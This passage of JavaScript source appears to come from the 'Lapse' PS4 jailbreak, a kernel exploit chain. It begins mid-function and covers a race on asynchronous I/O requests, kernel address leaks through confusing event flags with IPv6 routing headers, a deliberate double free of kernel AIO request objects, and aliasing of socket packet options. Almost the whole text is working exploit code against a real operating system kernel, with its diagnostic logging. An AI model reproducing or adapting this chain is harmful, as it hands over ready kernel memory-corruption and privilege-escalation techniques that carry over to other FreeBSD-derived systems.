            const sd_conn = accept(sd_listen, 0, 0);
            //log("Race attempt after accept")
            const linger_buf = malloc(8);
            write32(linger_buf, 1);
            write32(linger_buf.add(4), 1);
            set_sockopt(sd_client, SOL_SOCKET, SO_LINGER, linger_buf, 8);
            //log("Race attempt after set_sockopt")
            write32(reqs.add(which_req * 0x28 + 0x20), sd_client);

            ret = aio_submit_cmd_fun(cmd, reqs, num_reqs, 3, aio_ids);
            if (!ret.eq(BigInt.Zero)) {
                close(sd_client);
                close(sd_conn);
                continue;
            }
            //log("Race attempt after aio_submit_cmd_fun")
            aio_multi_cancel_fun(aio_ids, num_reqs, errors);
            //log("Race attempt after aio_multi_cancel_fun")
            aio_multi_poll_fun(aio_ids, num_reqs, errors);
            //log("Race attempt after aio_multi_poll_fun")
            
            close(sd_client);
            //log("Race attempt before race_one")
            const sd_pair = race_one(req_addr, sd_conn, sds);

            aio_multi_delete_fun(aio_ids, num_reqs, errors);
            close(sd_conn);

            if (sd_pair !== null) {
                log("Won race at attempt " + attempt);
                close(sd_listen);
                return sd_pair;
            }
        }

        close(sd_listen);
        return null;

    } catch (e) {
        log("Stage 1 error: " + e.message);
        return null;
    }
}

// Stage 2
function new_evf(name, flags) {
    const result = evf_create(name, 0, flags);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("evf_create error: " + hex(result));
    }
    return result;
}

function set_evf_flags(id, flags) {
    const result = evf_clear(id, 0);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("evf_clear error: " + hex(result));
    }
    result = evf_set(id, flags);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("evf_set error: " + hex(result));
    }
    return result;
}

function free_evf(id) {
    const result = evf_delete(id);
    if (result.eq(new BigInt(0xFFFFFFFF, 0xFFFFFFFF))) {
        throw new Error("evf_delete error: " + hex(result));
    }
    return result;
}

function verify_reqs2(addr, cmd) {
    if (read32(addr) !== cmd) {
        return false;
    }

    const heap_prefixes = [];

    for (var i = 0x10; i <= 0x20; i += 8) {
        if (read16(addr.add(i + 6)) !== 0xffff) {
            return false;
        }
        heap_prefixes.push(Number(read16(addr.add(i + 4))));
    }

    const state1 = Number(read32(addr.add(0x38)));
    const state2 = Number(read32(addr.add(0x3c)));
    if (!(state1 > 0 && state1 <= 4) || state2 !== 0) {
        return false;
    }

    if (!read64(addr.add(0x40)).eq(BigInt.Zero)) {
        return false;
    }

    for (var i = 0x48; i <= 0x50; i += 8) {
        if (read16(addr.add(i + 6)) === 0xffff) {
            if (read16(addr.add(i + 4)) !== 0xffff) {
                heap_prefixes.push(Number(read16(addr.add(i + 4))));
            }
        } else if (i === 0x50 || !read64(addr.add(i)).eq(BigInt.Zero)) {
            return false;
        }
    }

    if (heap_prefixes.length < 2) {
        return false;
    }

    const first_prefix = heap_prefixes[0];
    for (var idx = 1; idx < heap_prefixes.length; idx++) {
        if (heap_prefixes[idx] !== first_prefix) {
            return false;
        }
    }

    return true;
}

function leak_kernel_addrs(sd_pair, sds) {
    
    const sd = sd_pair[0];
    const buflen = 0x80 * LEAK_LEN;
    const buf = malloc(buflen);

    log("Confusing evf with rthdr...");

    const name = malloc(1);

    close(sd_pair[1]);

    var evf = null;
    for (var i = 1; i <= NUM_ALIAS; i++) {
        const evfs = [];

        for (var j = 1; j <= NUM_HANDLES; j++) {
            const evf_flags = 0xf00 | (j << 16);
            evfs.push(new_evf(name, evf_flags));
        }

        get_rthdr(sd, buf, 0x80);

        const flag = read32(buf);

        if ((flag & 0xf00) === 0xf00) {
            const idx = (flag >>> 16) & 0xffff;
            const expected_flag = (flag | 1);

            evf = evfs[idx - 1];

            set_evf_flags(evf, expected_flag);
            get_rthdr(sd, buf, 0x80);

            const val = read32(buf);
            if (val === expected_flag) {
                evfs.splice(idx - 1, 1);
            } else {
                evf = null;
            }
        }

        for (var k = 0; k < evfs.length; k++) {
            if (evf === null || evfs[k] !== evf) {
                free_evf(evfs[k]);
            }
        }

        if (evf !== null) {
            log("Confused rthdr and evf at attempt: " + i);
            break;
        }
    }

    if (evf === null) {
        log("Failed to confuse evf and rthdr");
        return null;
    }

    set_evf_flags(evf, 0xff00);

    const kernel_addr = read64(buf.add(0x28));
    log("\"evf cv\" string addr: " + hex(kernel_addr));

    const kbuf_addr = read64(buf.add(0x40)).add(-0x38);
    log("Kernel buffer addr: " + hex(kbuf_addr));

    const wbufsz = 0x80;
    const wbuf = malloc(wbufsz);
    const rsize = build_rthdr(wbuf, wbufsz);
    const marker_val = 0xdeadbeef;
    const reqs3_offset = 0x10;

    write32(wbuf.add(4), marker_val);
    write32(wbuf.add(reqs3_offset + 0), 1);                  // .ar3_num_reqs
    write32(wbuf.add(reqs3_offset + 4), 0);                  // .ar3_reqs_left
    write32(wbuf.add(reqs3_offset + 8), AIO_STATE_COMPLETE); // .ar3_state
    write8 (wbuf.add(reqs3_offset + 0xc), 0);                // .ar3_done
    write32(wbuf.add(reqs3_offset + 0x28), 0x67b0000);       // .ar3_lock.lock_object.lo_flags
    write64(wbuf.add(reqs3_offset + 0x38), 1);               // .ar3_lock.lk_lock = LK_UNLOCKED

    const num_elems = 6;
    const ucred = kbuf_addr.add(4);
    const leak_reqs = make_reqs1(num_elems);
    write64(leak_reqs.add(0x10), ucred);

    const num_loop = NUM_SDS;
    const leak_ids_len = num_loop * num_elems;
    const leak_ids = malloc(4 * leak_ids_len);
    const step = (4 * num_elems);
    const cmd = AIO_CMD_WRITE | AIO_CMD_FLAG_MULTI;

    var reqs2_off = null;
    var fake_reqs3_off = null;
    var fake_reqs3_sd = null;

    for (var i = 1; i <= NUM_LEAKS; i++) {
        for (var j = 1; j <= num_loop; j++) {
            write32(wbuf.add(8), j);
            aio_submit_cmd(cmd, leak_reqs, num_elems, 3, leak_ids + ((j - 1) * step));
            set_rthdr(sds[j - 1], wbuf, rsize);
        }
        
        get_rthdr(sd, buf, buflen);

        var sd_idx = null;
        reqs2_off = null;
        fake_reqs3_off = null;

        for (var off = 0x80; off < buflen; off += 0x80) {
            const offset = off;

            if (reqs2_off === null && verify_reqs2(buf.add(offset), AIO_CMD_WRITE)) {
                reqs2_off = off;
            }

            if (fake_reqs3_off === null) {
                const marker = read32(buf.add(offset + 4));
                if (marker === marker_val) {
                    fake_reqs3_off = off;
                    sd_idx = Number(read32(buf.add(offset + 8)));
                }
            }
        }

        if (reqs2_off !== null && fake_reqs3_off !== null) {
            log("Found reqs2 and fake reqs3 at attempt: " + i);
            fake_reqs3_sd = sds[sd_idx - 1];
            sds.splice(sd_idx - 1, 1);
            free_rthdrs(sds);
            sds.push(new_socket());
            break;
        }

        free_aios(leak_ids, leak_ids_len);
    }

    if (reqs2_off === null || fake_reqs3_off === null) {
        log("Could not leak reqs2 and fake reqs3");
        return null;
    }

    log("reqs2 offset: " + hex(reqs2_off));
    log("fake reqs3 offset: " + hex(fake_reqs3_off));

    get_rthdr(sd, buf, buflen);

    log("Leaked aio_entry:");

    var leak_str = "";
    for (var i = 0; i < 0x80; i += 8) {
        if (i % 16 === 0 && i !== 0) leak_str += "\n";
        leak_str += hex(read64(buf.add(reqs2_off + i))) + " ";
    }
    log(leak_str);
    

    const aio_info_addr = read64(buf.add(reqs2_off + 0x18));
    var reqs1_addr = read64(buf.add(reqs2_off + 0x10));
    reqs1_addr = reqs1_addr.and(new BigInt(0xFFFFFFFF, 0xFFFFFF00));
    const fake_reqs3_addr = kbuf_addr.add(fake_reqs3_off + reqs3_offset);

    log("reqs1_addr = " + hex(reqs1_addr));
    log("fake_reqs3_addr = " + hex(fake_reqs3_addr));

    log("Searching for target_id...");


    var target_id = null;
    var to_cancel = null;
    var to_cancel_len = null;

    const errors = malloc(4 * num_elems);

    for (var i = 0; i < leak_ids_len; i += num_elems) {
        aio_multi_cancel(leak_ids + (i * 4), num_elems, errors);
        get_rthdr(sd, buf, buflen);

        const state = read32(buf.add(reqs2_off + 0x38));
        if (state === AIO_STATE_ABORTED) {
            target_id = read32(leak_ids.add(i * 4));
            write32(leak_ids.add(i * 4), 0);

            log("Found target_id=" + hex(target_id) + ", i=" + i + ", batch=" + Math.floor(i / num_elems));

            const start = i + num_elems;
            to_cancel = leak_ids + start * 4;
            to_cancel_len = leak_ids_len - start;

            break;
        }
    }

    if (target_id === null) {
        log("Target ID not found");

        return null;
    }

    cancel_aios(to_cancel, to_cancel_len);
    free_aios2(leak_ids, leak_ids_len);

    log("Kernel addresses leaked successfully!");

    return {
        reqs1_addr: reqs1_addr,
        kbuf_addr: kbuf_addr,
        kernel_addr: kernel_addr,
        target_id: target_id,
        evf: evf,
        fake_reqs3_addr: fake_reqs3_addr,
        fake_reqs3_sd: fake_reqs3_sd,
        aio_info_addr: aio_info_addr
    };
}

// Stage 3

function make_aliased_pktopts(sds) {
    const tclass = malloc(4);
    
    for (var loop = 0; loop < NUM_ALIAS; loop++) {
        for (var i = 0; i < sds.length; i++) {
            write32(tclass, i);
            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
        }
        
        for (var i = 0; i < sds.length; i++) {
            get_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
            const marker = Number(read32(tclass));
            
            if (marker !== i) {
                const sd_pair = [sds[i], sds[marker]];
                log("Aliased pktopts at attempt " + loop + " (pair: " + sd_pair[0] + ", " + sd_pair[1] + ")");
                if (marker > i) {
                    sds.splice(marker, 1);
                    sds.splice(i, 1);
                } else {
                    sds.splice(i, 1);
                    sds.splice(marker, 1);
                }
                
                for (var j = 0; j < 2; j++) {
                    const sock_fd = new_socket();
                    set_sockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                    sds.push(sock_fd);
                }
                
                return sd_pair;
            }
        }
        
        for (var i = 0; i < sds.length; i++) {
            set_sockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        }
    }
    
    return null;
}

function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_addr) {
    const max_leak_len = (0xff + 1) << 3;
    const buf = malloc(max_leak_len);
    
    const num_elems = MAX_AIO_IDS;
    const aio_reqs = make_reqs1(num_elems);
    
    const num_batches = 2;
    const aio_ids_len = num_batches * num_elems;
    const aio_ids = malloc(4 * aio_ids_len);
    
    log("Overwriting rthdr with AIO queue entry...");
    var aio_not_found = true;
    free_evf(evf);
    
    for (var i = 0; i < NUM_CLOBBERS; i++) {
        spray_aio(num_batches, aio_reqs, num_elems, aio_ids, true);
        
        const size_ret = get_rthdr(sd, buf, max_leak_len);
        const cmd = read32(buf);
        
        if (size_ret === 8 && cmd === AIO_CMD_READ) {
            log("Aliased at attempt " + i);
            aio_not_found = false;
            cancel_aios(aio_ids, aio_ids_len);
            break;
        }
        
        free_aios(aio_ids, aio_ids_len, true);
    }
    
    if (aio_not_found) {
        log("Failed to overwrite rthdr");
        return null;
    }
    
    const reqs2_size = 0x80;
    const reqs2 = malloc(reqs2_size);
    const rsize = build_rthdr(reqs2, reqs2_size);
    
    write32(reqs2.add(4), 5);                   // ar2_ticket
    write64(reqs2.add(0x18), reqs1_addr);       // ar2_info
    write64(reqs2.add(0x20), fake_reqs3_addr);  // ar2_batch
    
    const states = malloc(4 * num_elems);
    const addr_cache = [];
    for (var i = 0; i < num_batches; i++) {
        addr_cache.push(aio_ids.add(i * num_elems * 4));
    }
    
    log("Overwriting AIO queue entry with rthdr...");
    
    close(sd);
    sd = null;
    
    function overwrite_aio_entry_with_rthdr() {
        log("Enter overwrite_aio_entry_with_rthdr");
        for (var i = 0; i < NUM_ALIAS; i++) {
            for (var j = 0; j < sds.length; j++) {
                set_rthdr(sds[j], reqs2, rsize);
            }
            //log("before for batch = 0 ...")
            for (var batch = 0; batch < addr_cache.length; batch++) {
                for (var j = 0; j < num_elems; j++) {
                    write32(states.add(j * 4), 0xFFFFFFFF);
                }
                
                //log("overwrite_aio_entry_with_rthdr - aio_multi_cancel_fun");
                aio_multi_cancel_fun(addr_cache[batch]+0, num_elems, states);
                
                var req_idx = -1;
                for (var j = 0; j < num_elems; j++) {
                    const val = read32(states.add(j * 4));
                    if (val === AIO_STATE_COMPLETE) {
                        req_idx = j;
                        break;
                    }
                }

                if (req_idx !== -1) {
                    log("Found req_id at batch " + batch + ", attempt " + i);
                    const aio_idx = batch * num_elems + req_idx;
                    const req_id_p = aio_ids.add(aio_idx * 4);
                    const req_id = read32(req_id_p);
                    
                    aio_multi_poll_fun(req_id_p, 1, states);
                    write32(req_id_p, 0);
                    //log("Exit overwrite_aio_entry_with_rthdr with req_id: " + req_id);
                    return req_id;
                }
            }
        }
        log("Exit overwrite_aio_entry_with_rthdr - null");
        return null;
    }
    
    const req_id = overwrite_aio_entry_with_rthdr();
    if (req_id === null) {
        log("Failed to overwrite AIO queue entry");
        return null;
    }
    
    log("overwrite_aio_entry_with_rthdr - free_aios2");
    free_aios2(aio_ids, aio_ids_len);
    
    const target_id_p = malloc(4);
    write32(target_id_p, target_id);
    
    log("overwrite_aio_entry_with_rthdr - aio_multi_poll_fun");
    aio_multi_poll_fun(target_id_p, 1, states);
    
    const sce_errs = malloc(8);
    write32(sce_errs, 0xFFFFFFFF); // -1
    write32(sce_errs.add(4), 0xFFFFFFFF); // -1
    
    const target_ids = malloc(8);
    write32(target_ids, req_id);
    write32(target_ids.add(4), target_id);
    
    log("Triggering double free...");
    aio_multi_delete_fun(target_ids, 2, sce_errs);
    
    log("Reclaiming memory...");
    
    const sd_pair = make_aliased_pktopts(sds_alt);
    
    const err1 = read32(sce_errs);
    const err2 = read32(sce_errs.add(4));
    
    write32(states, 0xFFFFFFFF); // -1
    write32(states.add(4), 0xFFFFFFFF); // -1
    
    aio_multi_poll_fun(target_ids, 2, states);
    
    var success = true;
    if (read32(states) !== SCE_KERNEL_ERROR_ESRCH) {
        log("ERROR: Bad delete of corrupt AIO request");
        success = false;
    }
    
    if (err1 !== 0 || err1 !== err2) {
        log("ERROR: Bad delete of ID pair");
        success = false;
    }
    
    if (!success) {
        log("Double free failed");
        return null;
    }
    
    if (sd_pair === null) {
        log("Failed to make aliased pktopts");
        return null;
    }
    
    return sd_pair;
}

// End

log("=== PS4 Lapse Jailbreak ===");

FW_VERSION = get_fwversion();
log("Detected PS4 firmware: " + FW_VERSION);

// function compare_version(a, b) {
//     const [amaj, amin] = a.split('.').map(Number);
//     const [bmaj, bmin] = b.split('.').map(Number);
//     return amaj === bmaj ? amin - bmin : amaj - bmaj;
// }

// if (compare_version(FW_VERSION, "8.00") < 0 || compare_version(FW_VERSION, "12.02") > 0) {
//     log("Unsupported PS4 firmware\nSupported: 8.00-12.02\nAborting...");
//     send_notification("Unsupported PS4 firmware\nAborting...");
//     return;
// }

//kernel_offset = get_kernel_offset(FW_VERSION);
//log("Kernel offsets loaded for FW " + FW_VERSION);

function lapse() {
    // === STAGE 0: Setup ===
    log("=== STAGE 0: Setup ===");
    const setup_success = setup();
    if (!setup_success) {
        log("Setup failed");
        send_notification("Lapse: Setup failed");
        //return;
    }
    log("Setup completed");

    // === STAGE 1 ===
    log("=== STAGE 1: Double-free AIO ===");
    const stage1_start = Date.now();
    const sd_pair = double_free_reqs2();
    const stage1_time = Date.now() - stage1_start;

    if (sd_pair === null) {
        log("[FAILED] Stage 1");
        send_notification("Lapse: FAILED at Stage 1");
        return;
    }
    log("[OK] Stage 1: " + stage1_time + "ms");

    log("=== STAGE 2: Leak kernel addresses ===");
    leak_result = leak_kernel_addrs(sd_pair, sds);
    if (leak_result === null) {
        log("Stage 2 kernel address leak failed");
        cleanup_fail();
        return;
    }
    log("Stage 2 completed");
    log("Leaked addresses:");
    log("  reqs1_addr: " + hex(leak_result.reqs1_addr));
    log("  kbuf_addr: " + hex(leak_result.kbuf_addr));
    log("  kernel_addr: " + hex(leak_result.kernel_addr));
    log("  target_id: " + hex(leak_result.target_id));
    log("  fake_reqs3_addr: " + hex(leak_result.fake_reqs3_addr));
    log("  aio_info_addr: " + hex(leak_result.aio_info_addr));

    log("=== STAGE 3: Double free SceKernelAioRWRequest ===");
    const pktopts_sds = double_free_reqs1(
        leak_result.reqs1_addr,
        leak_result.target_id,
        leak_result.evf,
        sd_pair[0],
        sds,
        sds_alt,
        leak_result.fake_reqs3_addr
    );
    
    close(leak_result.fake_reqs3_sd);

    if (pktopts_sds === null) {
        log("Stage 3 double free SceKernelAioRWRequest failed");
        cleanup_fail();
        return;
    }
    
    log("Stage 3 completed!");
    log("Aliased socket pair: " + hex(pktopts_sds[0]) + ", " + hex(pktopts_sds[1]));
}

function cleanup() {
    log("Performing cleanup...");

    try {
        if (block_fd !== 0xffffffff) {
            close(block_fd);
            block_fd = 0xffffffff;
        }

        if (unblock_fd !== 0xffffffff) {
            close(unblock_fd);
            unblock_fd = 0xffffffff;
        }

        if (typeof groom_ids !== 'undefined')
            if (groom_ids !== null) {
                const groom_ids_addr = malloc(4 * NUM_GROOMS);
                for (var i = 0; i < NUM_GROOMS; i++) {
                    write32(groom_ids_addr.add(i * 4), groom_ids[i]);
                }
                free_aios2(groom_ids_addr, NUM_GROOMS);
                groom_ids = null;
            }

        if (block_id !== 0xffffffff) {
            const block_id_buf = malloc(4);
            write32(block_id_buf, block_id);
            const block_errors = malloc(4);
            aio_multi_wait_fun(block_id_buf, 1, block_errors, 1, 0);
            aio_multi_delete_fun(block_id_buf, 1, block_errors);
            block_id = 0xffffffff;
        }

        if (sds !== null) {
            for (var i = 0; i < sds.length; i++) {
                close(sds[i]);
            }
            sds = null;
        }

        if (sds_alt !== null) {
            for (var i = 0; i < sds_alt.length; i++) {
                close(sds_alt[i]);
            }
            sds_alt = null;
        }

        if (typeof sd_pair !== 'undefined') {
            if (sd_pair !== null) {
                close(sd_pair[0]);
                close(sd_pair[1]);
            }
            sd_pair = null;
        }
        
        if (prev_core >= 0) {
            log("Restoring to previous core: " + prev_core);
            pin_to_core(prev_core);
            prev_core = -1;
        }
        
        set_rtprio(prev_rtprio);

        log("Cleanup completed");

    } catch (e) {
        log("Error during cleanup: " + e.message);
    }
}

function cleanup_fail() {
    cleanup();
}

try {
    lapse();
}
catch (e){
    log(e);
}

// Cleaning
cleanup();